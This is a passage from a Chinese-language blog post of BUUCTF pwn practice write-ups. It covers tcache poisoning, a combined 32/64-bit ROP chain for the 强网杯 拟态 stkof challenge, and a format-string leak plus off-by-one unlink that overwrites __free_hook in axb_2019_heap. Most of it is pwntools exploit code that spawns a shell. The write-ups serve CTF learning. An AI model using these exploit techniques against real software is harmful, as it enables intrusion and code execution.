class="number">2</span>,<span class="number">0x91</span>) <span class="comment"># chunk0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># fill tcache</span></span><br><span class="line">	free(<span class="number">1</span>)</span><br><span class="line">	add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># unsorted</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&#x27;number :&#x27;</span>)</span><br><span class="line"></span><br><span class="line">base = <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>))<span class="number">-96</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]<span class="number">-0x10</span></span><br><span class="line">leak(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">fileno = base+libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]+<span class="number">0x70</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,fileno) <span class="comment"># poisoning</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&#x27;number :&#x27;</span>)</span><br><span class="line">chunk0_mem = <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>))<span class="number">-0x30</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,chunk0_mem) <span class="comment"># poisoning</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xdeadbeef</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xdeadbeef</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">666</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="number">4</span>)</span><br></pre></td></tr></table></figure>


<h2 id="强网杯-拟态-stkof"><a href="#强网杯-拟态-stkof" class="headerlink" title="强网杯_拟态_stkof"></a>强网杯_拟态_stkof</h2><p>采用了拟态防御，简单来说就是要用同一个脚本同时在32位和64位程序上getshell且两个程序的输出必须相同。</p>
<p>首先检查两个二进制文件，漏洞都是简单的栈溢出并且空间很大。区别在于可以溢出的长度相差8字节，这8字节应该就是能够用同一个脚本的关键所在。</p>
<p>容易想到利用常规ret2syscall，分别写出32位和64位脚本：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pop_eax = <span class="number">0x80a8af6</span></span><br><span class="line">pop_dcb = <span class="number">0x806e9f1</span></span><br><span class="line">int_80 = <span class="number">0x80495a3</span></span><br><span class="line">data = <span class="number">0x80d7000</span></span><br><span class="line"></span><br><span class="line">chain86 = [</span><br><span class="line">	<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10c</span>+<span class="number">4</span>),</span><br><span class="line">	elf.sym[<span class="string">&#x27;read&#x27;</span>],</span><br><span class="line">	pop_dcb,<span class="number">0</span>,data,<span class="number">0x100</span>,</span><br><span class="line">	pop_dcb,<span class="number">0</span>,<span class="number">0</span>,data,</span><br><span class="line">	pop_eax,<span class="number">0xb</span>,</span><br><span class="line">	int_80</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">payload = flat(chain86)</span><br><span class="line">sa(<span class="string">&#x27;?&#x27;</span>,payload)</span><br><span class="line">s(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pop_rax = <span class="number">0x43b97c</span></span><br><span class="line">pop_rdi = <span class="number">0x4005f6</span></span><br><span class="line">pop_rsi = <span class="number">0x405895</span></span><br><span class="line">pop_rdx = <span class="number">0x43b9d5</span></span><br><span class="line">syscall = <span class="number">0x461645</span></span><br><span class="line">data = <span class="number">0x6a4e40</span></span><br><span class="line"></span><br><span class="line">chain64 = [</span><br><span class="line">	<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x110</span>+<span class="number">8</span>),</span><br><span class="line">	pop_rax,<span class="number">0</span>,pop_rdi,<span class="number">0</span>,</span><br><span class="line">	pop_rsi,data,pop_rdx,<span class="number">0x100</span>,</span><br><span class="line">	syscall,</span><br><span class="line">	pop_rax,<span class="number">59</span>,pop_rdi,data,</span><br><span class="line">	pop_rsi,<span class="number">0</span>,pop_rdx,<span class="number">0</span>,</span><br><span class="line">	syscall</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">payload = flat(chain64)</span><br><span class="line">sa(<span class="string">&#x27;?&#x27;</span>,payload)</span><br><span class="line">s(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>那么怎么把两者合并呢？这就需要用到8字节的栈溢出长度差，在这8字节中，我们分别调整32位程序和64位程序的<code>esp</code>和<code>rsp</code>指针，使得经过调整后栈上的返回地址指向payload的不同部分。</p>
<p>这里需要注意的是，栈变量在32位下位于<code>esp+0xc</code>，在64位下位于<code>rsp+0x0</code>，在计算需要填充的padding时需要考虑到这一点。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">pop_eax = <span class="number">0x80a8af6</span></span><br><span class="line">pop_dcb = <span class="number">0x806e9f1</span></span><br><span class="line">int_80 = <span class="number">0x80495a3</span></span><br><span class="line">data86 = <span class="number">0x80d7000</span></span><br><span class="line">read = <span class="number">0x806c8e0</span></span><br><span class="line">add_esp_20 = <span class="number">0x80a69f2</span></span><br><span class="line"></span><br><span class="line">offset86 = <span class="number">0x20</span><span class="number">-0xc</span> <span class="comment"># esp+0xc</span></span><br><span class="line">chain86 = [</span><br><span class="line">	<span class="string">&#x27;a&#x27;</span>*offset86,</span><br><span class="line">	read,</span><br><span class="line">	pop_dcb,<span class="number">0</span>,data86,<span class="number">0x8</span>,</span><br><span class="line">	pop_dcb,<span class="number">0</span>,<span class="number">0</span>,data86,</span><br><span class="line">	pop_eax,<span class="number">0xb</span>,</span><br><span class="line">	int_80</span><br><span class="line">]</span><br><span class="line">payload86 = flat(chain86,word_size=<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x43b97c</span></span><br><span class="line">pop_rdi = <span class="number">0x4005f6</span></span><br><span class="line">pop_rsi = <span class="number">0x405895</span></span><br><span class="line">pop_rdx = <span class="number">0x43b9d5</span></span><br><span class="line">syscall = <span class="number">0x461645</span></span><br><span class="line">data64 = <span class="number">0x6a4e40</span></span><br><span class="line">add_rsp_80 = <span class="number">0x40cd17</span></span><br><span class="line"></span><br><span class="line">offset64 = <span class="number">0x80</span>-<span class="built_in">len</span>(payload86) <span class="comment"># rsp+0x0</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(offset64)</span><br><span class="line">chain64 = [</span><br><span class="line">	<span class="string">&#x27;a&#x27;</span>*offset64,</span><br><span class="line">	pop_rax,<span class="number">0</span>,pop_rdi,<span class="number">0</span>,</span><br><span class="line">	pop_rsi,data64,pop_rdx,<span class="number">0x100</span>,</span><br><span class="line">	syscall,</span><br><span class="line">	pop_rax,<span class="number">59</span>,pop_rdi,data64,</span><br><span class="line">	pop_rsi,<span class="number">0</span>,pop_rdx,<span class="number">0</span>,</span><br><span class="line">	syscall</span><br><span class="line">]</span><br><span class="line">payload64 = flat(chain64,word_size=<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x110</span> + (p32(add_esp_20)+<span class="string">&#x27;aaaa&#x27;</span>) + p64(add_rsp_80) + payload86 + payload64</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&#x27;?&#x27;</span>,payload)</span><br><span class="line">s(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>


<h2 id="axb-2019-heap"><a href="#axb-2019-heap" class="headerlink" title="axb_2019_heap"></a>axb_2019_heap</h2><p>利用格式化字符串漏洞泄露堆地址和libc。随后，可以发现<code>edit</code>时存在off by one，我们在构造unlink的fake chunk时，该漏洞会导致修改下一个chunk的<code>prev_size</code>后会覆盖掉它的<code>size</code>字段最后一个字节。但是同样的，我们也可以利用该漏洞手动恢复最后一个字节。，这里是<code>0xa0</code>。</p>
<p>接下来就常规unlink，覆盖<code>free_hook</code>为<code>system</code>，注意维持原<code>note</code>数组结构。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">sla(<span class="string">&#x27;name: &#x27;</span>,<span class="string">&#x27;%11$p.%15$p&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">heap = <span class="built_in">int</span>(ru(<span class="string">&#x27;.&#x27;</span>),<span class="number">16</span>)<span class="number">-0x1186</span></span><br><span class="line">base = <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)<span class="number">-0x20830</span></span><br><span class="line">leak(<span class="string">&#x27;heap&#x27;</span>,heap)</span><br><span class="line">leak(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line"></span><br><span class="line">note = heap+<span class="number">0x202060</span></span><br><span class="line">system = base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x98</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x98</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x90</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fd = note<span class="number">-0x18</span></span><br><span class="line">bk = note<span class="number">-0x10</span></span><br><span class="line">fake = flat(<span class="number">0</span>,<span class="number">0x91</span>,fd,bk).ljust(<span class="number">0x90</span>,<span class="string">&#x27;\x00&#x27;</span>) + p64(<span class="number">0x90</span>)+<span class="string">&#x27;\xa0&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,fake)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,free_hook,<span class="number">0x98</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(system))</span><br><span class="line">free(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
</div><div class="article-licensing box"><div class="licensing-title"><p>BUUCTF Pwn 练习</p><p><a href="https://signormercurio.me/post/BUUPwn/">https://signormercurio.me/post/BUUPwn/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>Mercury</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2019-12-14</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="" rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移</a><a class="link-muted mr-2" rel="tag" href="/tags/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/">整数溢出</a><a class="link-muted mr-2" rel="tag" href="/tags/ROP/">ROP</a><a class="link-muted mr-2" rel="tag" href="/tags/fastbin-attack/">fastbin-attack</a><a class="link-muted mr-2" rel="tag" href="/tags/mprotect/">mprotect</a><a class="link-muted mr-2" rel="tag" href="/tags/SROP/">SROP</a><a class="link-muted mr-2" rel="tag" href="/tags/tcache/">tcache</a><a class="link-muted mr-2" rel="tag" href="/tags/off-by-one/">off-by-one</a><a class="link-muted mr-2" rel="tag" href="/tags/unlink/">unlink</a><a class="link-muted mr-2" rel="tag" href="/tags/fastbin-consolidation/">fastbin-consolidation</a><a class="link-muted mr-2" rel="tag" href="/tags/mmap-thresold/">mmap_thresold</a><a class="link-muted mr-2" rel="tag" href="/tags/House-of-Force/">House-of-Force</a><a class="link-muted mr-2" rel="tag" href="/tags/House-of-Spirit/">House-of-Spirit</a><a class="link-muted mr-2" rel="tag" href="/tags/largebin-attack/">largebin-attack</a><a class="link-muted mr-2" rel="tag" href="/tags/House-of-Orange/">House-of-Orange</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/post/ElGamalECC/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">ElGamal 密码方案的椭圆曲线形式实现</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/post/QTableSSpagination/"><span class="level-item">QTable 服务端分页实践</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div class="content" id="valine-thread"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script>new Valine({
            el: '#valine-thread' ,
            appId: "RkxCznUcvfzFBgfMiMr0BAfd-gzGzoHsz",
            appKey: "sw2sEPOl4haCAXKUFYiBFMrR",
            placeholder: "Leave comments here...",
            avatar: "mm",
            
            meta: ["nick","mail","link"],
            pageSize: 10,
            lang: "en",
            visitor: true,
            highlight: true,
            
            
            
            
            
            requiredFields: ["nick","mail"],
        });</script></div></div></div><!--!--><div class="column column-right is-4-tablet is-4-desktop is-4-widescreen  order-3 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#test-your-nc"><span class="level-left"><span class="level-item">1</span><span class="level-item">test_your_nc</span></span></a></li><li><a class="level is-mobile" href="#rip"><span class="level-left"><span class="level-item">2</span><span class="level-item">rip</span></span></a></li><li><a class="level is-mobile" href="#warmup-csaw-2016"><span class="level-left"><span class="level-item">3</span><span class="level-item">warmup_csaw_2016</span></span></a></li><li><a class="level is-mobile" href="#pwn1-sctf-2016"><span class="level-left"><span class="level-item">4</span><span class="level-item">pwn1_sctf_2016</span></span></a></li><li><a class="level is-mobile" href="#ciscn-2019-c-1"><span class="level-left"><span class="level-item">5</span><span class="level-item">ciscn_2019_c_1</span></span></a></li><li><a class="level is-mobile" href="#ciscn-2019-n-1"><span class="level-left"><span class="level-item">6</span><span class="level-item">ciscn_2019_n_1</span></span></a></li><li><a class="level is-mobile" href="#ciscn-2019-en-2"><span class="level-left"><span class="level-item">7</span><span class="level-item">ciscn_2019_en_2</span></span></a></li><li><a class="level is-mobile" href="#OGeek2019-babyrop"><span class="level-left"><span class="level-item">8</span><span class="level-item">[OGeek2019]babyrop</span></span></a></li><li><a class="level is-mobile" href="#babyheap-0ctf-2017"><span class="level-left"><span class="level-item">9</span><span class="level-item">babyheap_0ctf_2017</span></span></a></li><li><a class="level is-mobile" href="#get-started-3dsctf-2016"><span class="level-left"><span class="level-item">10</span><span class="level-item">get_started_3dsctf_2016</span></span></a></li><li><a class="level is-mobile" href="#not-the-same-3dsctf-2016"><span class="level-left"><span class="level-item">11</span><span class="level-item">not_the_same_3dsctf_2016</span></span></a></li><li><a class="level is-mobile" href="#第五空间-2019-决赛-PWN5"><span class="level-left"><span class="level-item">12</span><span class="level-item">[第五空间 2019 决赛]PWN5</span></span></a></li><li><a class="level is-mobile" href="#ciscn-2019-n-8"><span class="level-left"><span class="level-item">13</span><span class="level-item">ciscn_2019_n_8</span></span></a></li><li><a class="level is-mobile" href="#babyfengshui-33c3-2016"><span class="level-left"><span class="level-item">14</span><span class="level-item">babyfengshui_33c3_2016</span></span></a></li><li><a class="level is-mobile" href="#ciscn-2019-s-3"><span class="level-left"><span class="level-item">15</span><span class="level-item">ciscn_2019_s_3</span></span></a></li><li><a class="level is-mobile" href="#HarekazeCTF2019-baby-rop"><span class="level-left"><span class="level-item">16</span><span class="level-item">[HarekazeCTF2019]baby_rop</span></span></a></li><li><a class="level is-mobile" href="#pwn2-sctf-2016"><span class="level-left"><span class="level-item">17</span><span class="level-item">pwn2_sctf_2016</span></span></a></li><li><a class="level is-mobile" href="#ez-pz-hackover-2016"><span class="level-left"><span class="level-item">18</span><span class="level-item">ez_pz_hackover_2016</span></span></a></li><li><a class="level is-mobile" href="#ciscn-2019-ne-5"><span class="level-left"><span class="level-item">19</span><span class="level-item">ciscn_2019_ne_5</span></span></a></li><li><a class="level is-mobile" href="#HarekazeCTF2019-baby-rop2"><span class="level-left"><span class="level-item">20</span><span class="level-item">[HarekazeCTF2019]baby_rop2</span></span></a></li><li><a class="level is-mobile" href="#ciscn-2019-n-5"><span class="level-left"><span class="level-item">21</span><span class="level-item">ciscn_2019_n_5</span></span></a></li><li><a class="level is-mobile" href="#ciscn-2019-final-3"><span class="level-left"><span class="level-item">22</span><span class="level-item">ciscn_2019_final_3</span></span></a></li><li><a class="level is-mobile" href="#ciscn-2019-es-2"><span class="level-left"><span class="level-item">23</span><span class="level-item">ciscn_2019_es_2</span></span></a></li><li><a class="level is-mobile" href="#roarctf-2019-easy-pwn"><span class="level-left"><span class="level-item">24</span><span class="level-item">roarctf_2019_easy_pwn</span></span></a></li><li><a class="level is-mobile" href="#ciscn-2019-n-3"><span class="level-left"><span class="level-item">25</span><span class="level-item">ciscn_2019_n_3</span></span></a></li><li><a class="level is-mobile" href="#hitcon2014-stkof"><span class="level-left"><span class="level-item">26</span><span class="level-item">hitcon2014_stkof</span></span></a></li><li><a class="level is-mobile" href="#sleepyHolder-hitcon-2016"><span class="level-left"><span class="level-item">27</span><span class="level-item">sleepyHolder_hitcon_2016</span></span></a></li><li><a class="level is-mobile" href="#secretHolder-hitcon-2016"><span class="level-left"><span class="level-item">28</span><span class="level-item">secretHolder_hitcon_2016</span></span></a></li><li><a class="level is-mobile" href="#bcloud-bctf-2016"><span class="level-left"><span class="level-item">29</span><span class="level-item">bcloud_bctf_2016</span></span></a></li><li><a class="level is-mobile" href="#lctf2016-pwn200"><span class="level-left"><span class="level-item">30</span><span class="level-item">lctf2016_pwn200</span></span></a></li><li><a class="level is-mobile" href="#zctf2016-note2"><span class="level-left"><span class="level-item">31</span><span class="level-item">zctf2016_note2</span></span></a></li><li><a class="level is-mobile" href="#zctf2016-note3"><span class="level-left"><span class="level-item">32</span><span class="level-item">zctf2016_note3</span></span></a></li><li><a class="level is-mobile" href="#0ctf-2018-heapstorm2"><span class="level-left"><span class="level-item">33</span><span class="level-item">0ctf_2018_heapstorm2</span></span></a></li><li><a class="level is-mobile" href="#houseoforange-hitcon-2016"><span class="level-left"><span class="level-item">34</span><span class="level-item">houseoforange_hitcon_2016</span></span></a></li><li><a class="level is-mobile" href="#ciscn-2019-final-2"><span class="level-left"><span class="level-item">35</span><span class="level-item">ciscn_2019_final_2</span></span></a></li><li><a class="level is-mobile" href="#强网杯-拟态-stkof"><span class="level-left"><span class="level-item">36</span><span class="level-item">强网杯_拟态_stkof</span></span></a></li><li><a class="level is-mobile" href="#axb-2019-heap"><span class="level-left"><span class="level-item">37</span><span class="level-item">axb_2019_heap</span></span></a></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-10T08:27:59.000Z">2021-09-10</time></p><p class="title"><a href="/post/Container/">容器技术原理</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">探索</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-08T07:50:13.000Z">2021-09-08</time></p><p class="title"><a href="/post/GoError/">Go Error 处理</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">探索</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-08-26T14:57:42.000Z">2021-08-26</time></p><p class="title"><a href="/post/M1Win11/">在 MacBook Pro M1 上运行 Windows 11</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">探索</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-08-21T03:48:08.000Z">2021-08-21</time></p><p class="title"><a href="/post/TencentShit/">腾讯生态的泥沼</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">探索</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-07-29T15:26:26.000Z">2021-07-29</time></p><p class="title"><a href="/post/JsMisc/">Javascript 杂记</a></p><p class="categories"><a href="/categories/%E6%8E%A2%E7%B4%A2/">探索</a></p></div></article></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/favicon.png" alt="Lab on Mercury" height="28"></a><p class="is-size-7"><span>&copy; 2021 Mercury</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" async></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><div id="outdated"><h6>Your browser is out-of-date!</h6><p>Update your browser to view this website correctly.&amp;npsb;<a id="btnUpdateBrowser" target="_blank" rel="noopener" href="http://outdatedbrowser.com/">Update my browser now </a></p><p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">×</a></p></div><script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script><script>window.addEventListener("load", function () {
            outdatedBrowser({
                bgColor: '#f25648',
                color: '#ffffff',
                lowerThan: 'object-fit' // display on IE11 or below
            });
        });</script><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>